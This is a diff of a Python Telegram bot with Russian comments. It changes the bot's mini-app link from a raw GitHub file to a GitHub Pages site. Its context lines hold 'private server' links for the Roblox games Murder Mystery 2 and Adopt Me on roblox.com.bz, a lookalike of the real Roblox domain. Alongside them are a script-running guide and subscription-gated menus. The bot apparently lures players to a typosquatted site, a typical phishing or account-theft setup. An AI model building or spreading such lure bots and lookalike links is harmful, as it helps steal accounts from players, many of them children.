@@ -28,9 +28,9 @@ KOREAN_MM2_LINK = "https://roblox.com.bz/games/142823291/Murder-Mystery-2?privat
 KOREAN_ADOPT_LINK = "https://roblox.com.bz/games/920587237/Adopt-Me?privateServerLinkCode=67807728184198406550153024608844"
 
 # ============================================================
-# ТВОЯ РАБОЧАЯ ССЫЛКА (GITHUB)
+# ПРАВИЛЬНАЯ ССЫЛКА (GITHUB PAGES, НЕ RAW)
 # ============================================================
-WEB_APP_URL = "https://raw.githubusercontent.com/fsfsfss323/webapp/refs/heads/main/index.html"
+WEB_APP_URL = "https://fsfsfss323.github.io/webapp/"
 
 GUIDE_TEXT = """
 📖 *КАК ЗАПУСТИТЬ СКРИПТЫ?*
@@ -212,7 +212,7 @@ def get_unsub_keyboard(not_subbed, is_ref=False):
     return keyboard
 
 # ============================================================
-# ГЛАВНОЕ МЕНЮ С MINI APP (РАБОЧАЯ ССЫЛКА)
+# ГЛАВНОЕ МЕНЮ С MINI APP
 # ============================================================
 def get_success_keyboard():
     keyboard = types.InlineKeyboardMarkup(row_width=1)
@@ -221,7 +221,7 @@ def get_success_keyboard():
     keyboard.add(types.InlineKeyboardButton(text="🔒 Приватный сервер MM2", callback_data="get_private"))
     
     # ============================================================
-    # КНОПКА С МИНИ-ПРИЛОЖЕНИЕМ (ССЫЛКА НА GITHUB)
+    # КНОПКА С МИНИ-ПРИЛОЖЕНИЕМ (GitHub Pages)
     # ============================================================
     keyboard.add(types.InlineKeyboardButton(
         text="🌐 ВСЕ СЕРВЕРА 🚀",
